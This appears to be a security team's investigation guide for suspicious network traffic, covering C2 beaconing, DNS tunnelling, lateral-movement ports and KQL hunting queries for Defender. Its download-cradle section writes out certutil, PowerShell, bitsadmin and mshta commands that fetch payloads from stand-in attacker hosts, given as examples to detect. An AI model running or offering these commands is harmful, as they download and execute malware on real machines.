# Suspicious network activity — investigation

## What you're looking for

Malware needs to phone home, download tools, or exfiltrate data. All of that leaves network traces. The key question for every connection: is this process supposed to be making this call, to this destination, this many times?

---

## C2 beaconing signals

Full detail → [../08-c2-beaconing/investigation.md](../08-c2-beaconing/investigation.md)

| Signal | What it looks like |
|--------|--------------------|
| High connection count | Same device → same external IP 30+ times per day |
| Regular timing intervals | Low standard deviation = mechanical timer |
| Uniform byte sizes | Identical bytes sent/received on every connection (not available in MDE; needs proxy/firewall logs) |
| After-hours traffic | Connections at 1–5am with no user logged in |
| Suspicious process | svchost from AppData, random binary making outbound calls |

**Cobalt Strike defaults:** 60s interval, 0% jitter, port 443, IE7 user agent

---

## Download cradles

```
certutil.exe -urlcache -split -f "http://185.x.x.x/payload.exe" C:\Users\Public\update.exe
powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://...')"
bitsadmin.exe /transfer job1 http://malicious.com/p.exe C:\Temp\p.exe
mshta.exe http://185.x.x.x/payload.hta
```

Suspicious destinations: raw IPs, paste sites, newly registered domains

---

## DNS beaconing

```
11:00:00  aGVsbG8.c2.attacker-domain.com
11:01:01  d29ybGQ.c2.attacker-domain.com
```

Base64-encoded subdomains changing every request = DNS tunnelling or C2.

---

## LOTS — Living Off Trusted Sites

Malware using legitimate cloud services for C2 or exfil. Full detail → [../09-lots-cloud-c2/investigation.md](../09-lots-cloud-c2/investigation.md)

Scripting engines connecting to: Discord CDN, Telegram API, Pastebin, GitHub raw, OneDrive, Google Drive.

---

## Lateral movement — network signals

| Pattern | Meaning |
|---------|---------|
| Many connections to internal IPs on port 445 | SMB scanning |
| Connections to port 3389 on multiple internal IPs | RDP lateral movement |
| Connections to port 5985/5986 | WinRM / PowerShell remoting |
| Connections to port 135/139 | WMI or legacy SMB |

---

## KQL queries

### All external connections from a device
```kql
// 03 — all external connections from one device
// Runs in: Defender XDR Advanced Hunting (also works in Sentinel when the table is streamed)
// Replace HOSTNAME with the short device name (e.g. PC01); startswith matches the FQDN, case-insensitive
// TODO: byte volumes need proxy/firewall logs; DeviceNetworkEvents has no SentBytes/ReceivedBytes

// REPLACE: incident time (T0, UTC) on the next line before running
let T0 = datetime(PASTE_TIME_UTC);
DeviceNetworkEvents
| where DeviceName startswith "HOSTNAME"
| where Timestamp between ((T0 - 24h) .. (T0 + 24h))
| where RemoteIPType != "Private"
| project Timestamp, RemoteIP, RemoteUrl, RemotePort,
    InitiatingProcessFileName
| order by Timestamp asc
```

### High connection count
```kql
// C2 beaconing detection — high connection count to single external destination
// Runs in: Defender XDR Advanced Hunting (also works in Sentinel when the table is streamed)
// Primary beacon signal: same device hitting same external IP 30+ times per day
// Sort by ConnectionCount desc and investigate anything above 30 to a non-CDN destination
// Counts ConnectionSuccess rows in the 24h before T0 (24h keeps the 30-per-day threshold meaningful)
// TODO: byte volumes need proxy/firewall logs; DeviceNetworkEvents has no byte-count columns
// Ref: docs/scenarios/08-c2-beaconing/investigation.md, docs/scenarios/03-suspicious-network-activity/investigation.md

// REPLACE: incident time (T0, UTC) on the next line before running
let T0 = datetime(PASTE_TIME_UTC);
DeviceNetworkEvents
| where Timestamp between ((T0 - 24h) .. T0)
| where ActionType == "ConnectionSuccess"
| where RemoteIPType != "Private"
| where RemoteIP != ""
| summarize
    ConnectionCount = count(),
    FirstSeen = min(Timestamp),
    LastSeen = max(Timestamp),
    Processes = make_set(InitiatingProcessFileName, 3)
    by DeviceName, RemoteIP, RemoteUrl, RemotePort
| where ConnectionCount > 30
| extend DurationHrs = round(
    datetime_diff('minute', LastSeen, FirstSeen) / 60.0, 1)
| order by ConnectionCount desc
```

### Internal lateral movement scanning
```kql
DeviceNetworkEvents
| where DeviceName == "HOSTNAME"
| where RemoteIPType == "Private"
| where RemotePort in (445, 3389, 22, 135, 139, 5985, 5986)
| where TimeGenerated > ago(2h)
| summarize TargetCount = dcount(RemoteIP) by RemotePort, InitiatingProcessFileName
| order by TargetCount desc
```

### Unusual outbound ports
```kql
DeviceNetworkEvents
| where TimeGenerated > ago(24h)
| where RemoteIPType != "Private"
| where RemotePort in (4444, 4445, 1337, 8080, 8443, 8888, 9001, 50050, 31337)
| where InitiatingProcessFileName !in~ (
    "chrome.exe", "msedge.exe", "firefox.exe", "teams.exe")
| project TimeGenerated, DeviceName, RemoteIP, RemotePort,
    InitiatingProcessFileName, InitiatingProcessCommandLine
```
